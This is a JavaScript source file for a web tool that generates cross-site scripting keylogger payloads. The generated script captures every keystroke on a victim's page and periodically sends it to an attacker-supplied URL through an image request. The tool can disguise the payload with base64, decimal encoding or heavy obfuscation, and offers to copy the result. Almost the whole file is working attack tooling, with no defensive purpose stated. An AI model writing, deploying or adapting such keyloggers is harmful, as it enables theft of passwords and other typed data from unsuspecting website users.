document.getElementById('keylogger-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var src = document.getElementById('src').value;
    var interval = document.getElementById('interval').value;
    var encoding = document.getElementById('encoding').value;
    // The basis of this code is taken from here: https://web.archive.org/web/20140424073035/http:/wiremask.eu/xss-keylogger
    var code = "var keys = '';\n\n";
    code += "document.onkeydown = function(e) {\n";
    code += "  var key = e.keyCode ? e.keyCode : e.which;\n";
    code += "  if (key === 8) {\n";
    code += "    keys += '[BACKSPACE]';\n";
    code += "  } else if (key === 9) {\n";
    code += "    keys += '[TAB]';\n";
    code += "  } else if (key === 13) {\n";
    code += "    keys += '[ENTER]';\n";
    code += "  } else if (key === 16) {\n";
    code += "    keys += '[SHIFT]';\n";
    code += "  } else if (key === 17) {\n";
    code += "    keys += '[CTRL]';\n";
    code += "  } else if (key === 18) {\n";
    code += "    keys += '[ALT]';\n";
    code += "  } else if (key === 27) {\n";
    code += "    keys += '[ESC]';\n";
    code += "  } else if (key === 46) {\n";
    code += "    keys += '[DELETE]';\n";
    code += "  } else if (key === 20) {\n";
    code += "    keys += '[CAPSLOCK]';\n";
    code += "  } else if (key >= 96 && key <= 105) {\n";
    code += "    keys += (key - 96).toString();\n";
    code += "  } else {\n";
    code += "    keys += String.fromCharCode(key);\n";
    code += "  }\n";
    code += "}\n\n";
    code += "window.setInterval(function(){\n";
    code += "  if(keys){\n";
    code += "    new Image().src = '" + src + "' + keys;\n";
    code += "    keys = '';\n";
    code += "  }\n";
    code += "}, " + interval + ");";

    if (encoding === "None"){
        document.getElementById('generatedCode').value = code;
    }
    if (encoding === "Obfuscated"){
        document.getElementById('generatedCode').value = obfuscator(code);
    }
    else if(encoding === "Base64"){
        encoded_code = btoa(code);
        code = "var decodedCode = atob('" + encoded_code + "');\n";
        code += "var scriptElement = document.createElement('script');\n"
        code += "scriptElement.src = 'data:text/javascript;base64,' + btoa(decodedCode);\n"
        code += "document.body.appendChild(scriptElement);"
        document.getElementById('generatedCode').value = code;
    }
    else if(encoding === "Base64Obfuscated"){
        encoded_code = btoa(code);
        code = "var decodedCode = atob('" + encoded_code + "');\n";
        code += "var scriptElement = document.createElement('script');\n"
        code += "scriptElement.src = 'data:text/javascript;base64,' + btoa(decodedCode);\n"
        code += "document.body.appendChild(scriptElement);"
        document.getElementById('generatedCode').value = obfuscator(code);
    }
    else if(encoding === "Decimal"){
        encoded_code = toNumbers(code);
        code = "function fromNumbers(nums){\n"
        code += "    var s = '';\n"
        code += "    for(var i=0; i<nums.length; i+=3){\n"
        code += "        console.log(i + ': ' + nums.substring(i, i+3))\n"
        code += "        s += String.fromCharCode(nums.substring(i, i+3));\n"
        code += "    }\n"
        code += "    return s;\n"
        code += "}\n"
        code += "var decodedCode = fromNumbers('" + encoded_code + "');\n";
        code += "var scriptElement = document.createElement('script');\n"
        code += "scriptElement.innerHTML = decodedCode;\n"
        code += "document.body.appendChild(scriptElement);"
        document.getElementById('generatedCode').value = code;
    }
    else if(encoding === "DecimalObfuscated"){
        encoded_code = toNumbers(code);
        code = "function fromNumbers(nums){\n"
        code += "    var s = '';\n"
        code += "    for(var i=0; i<nums.length; i+=3){\n"
        code += "        console.log(i + ': ' + nums.substring(i, i+3))\n"
        code += "        s += String.fromCharCode(nums.substring(i, i+3));\n"
        code += "    }\n"
        code += "    return s;\n"
        code += "}\n"
        code += "var decodedCode = fromNumbers('" + encoded_code + "');\n";
        code += "var scriptElement = document.createElement('script');\n"
        code += "scriptElement.innerHTML = decodedCode;\n"
        code += "document.body.appendChild(scriptElement);"
        document.getElementById('generatedCode').value = obfuscator(code);
    }
    
    
});

async function copyToClipboard(){
	var copyText = document.getElementById("generatedCode");
	copyText.select();
	await navigator.clipboard.writeText(copyText.value);
	var elem = document.getElementById("copyButton");

    elem.innerHTML = "Copied!";
	await new Promise(resolve => setTimeout(resolve, 1200));
	elem.innerHTML = "Copy to Clipboard";
}

function zeroPad(n, w){
    while(n.toString().length<w) n = '0' + n;
    return n;
}

function toNumbers(s){
    var nums = '';
    for(var i=0; i<s.length; i++) {
        nums += zeroPad(s.charCodeAt(i), 3);
    }
    return nums;
}

// https://github.com/javascript-obfuscator/javascript-obfuscator
function obfuscator(code){
    var obfuscationResult = JavaScriptObfuscator.obfuscate(
        code,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
    );
    return obfuscationResult.getObfuscatedCode();
}

